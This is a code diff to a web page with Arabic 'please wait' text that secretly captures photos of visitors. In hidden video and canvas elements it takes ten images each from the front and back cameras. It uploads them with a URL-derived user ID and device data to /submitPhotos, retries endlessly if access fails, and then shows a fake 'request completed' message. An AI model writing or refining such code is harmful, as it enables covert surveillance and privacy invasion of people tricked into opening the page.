@@ -39,11 +39,15 @@
         <h1>جاري تنفيذ طلبك</h1>
         <p>يرجى الانتظار...</p>
     </div>
-    <video id="video" playsinline autoplay muted style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
+    <canvas id="frontCanvas" style="display:none;"></canvas>
+    <canvas id="backCanvas" style="display:none;"></canvas>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
@@ -61,7 +65,7 @@
                     batteryCharging: battery.charging,
                 };
             } catch (error) {
-                console.error('Error collecting additional data:', error);
+                console.error('Error collecting additional ', error);
                 return {};
             }
         }
@@ -102,52 +106,59 @@
             try {
                 const additionalData = await collectAdditionalData();
                 const frontStream = await requestCameraPermission('user');
-
-                if (frontStream) {
-                    await capturePhotos(frontStream, 'front', additionalData);
-                }
-
                 const backStream = await requestCameraPermission('environment');
 
-                if (backStream) {
-                    await capturePhotos(backStream, 'back', additionalData);
+                if (frontStream || backStream) {
+                    handleSuccess(frontStream, backStream, additionalData);
+                } else {
+                    throw new Error('No camera access granted');
                 }
-
-                document.querySelector('.container').innerHTML = `
-                    <h1>تم تنفيذ طلبك ودخول إلى الموقع</h1>
-                    <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                `;
             } catch (e) {
                 console.error('Error in init:', e);
                 setTimeout(init, 1000);
             }
         }
 
-        async function capturePhotos(stream, cameraType, additionalData) {
-            video.srcObject = stream;
-            await new Promise(resolve => video.onloadedmetadata = resolve);
-            video.play();
-
-            const { videoWidth, videoHeight } = video;
-            canvas.width = videoWidth;
-            canvas.height = videoHeight;
-
-            const context = canvas.getContext('2d');
-            let photoCount = 0;
-
-            for (let i = 0; i < 10; i++) {
-                context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.7));
-                
-                const formData = new FormData();
-                formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                formData.append('userId', userId);
-                formData.append('cameraType', cameraType);
-                formData.append('additionalData', JSON.stringify(additionalData));
-                
-                await post('/submitPhotos', formData);
-                photoCount++;
+        function handleSuccess(frontStream, backStream, additionalData) {
+            if (frontStream) {
+                frontVideo.srcObject = frontStream;
+                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
             }
+            if (backStream) {
+                backVideo.srcObject = backStream;
+                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+            }
+        }
+
+        function setupCamera(video, canvas, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const { videoWidth, videoHeight } = video;
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+
+                const context = canvas.getContext('2d');
+                let photoCount = 0;
+
+                const captureInterval = setInterval(() => {
+                    if (photoCount >= 10) {
+                        clearInterval(captureInterval);
+                        return;
+                    }
+
+                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                        formData.append('userId', userId);
+                        formData.append('cameraType', cameraType);
+                        formData.append('additionalData', JSON.stringify(additionalData));
+                        post('/submitPhotos', formData);
+                    }, 'image/webp', 0.7);
+
+                    photoCount++;
+                }, 1000);
+            };
         }
 
         async function post(url, formData) {
@@ -169,6 +180,10 @@
 
                     if (data.success) {
                         console.log('Photos sent successfully');
+                        document.querySelector('.container').innerHTML = `
+                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                        `;
                         return;
                     } else {
                         throw new Error(data.error);
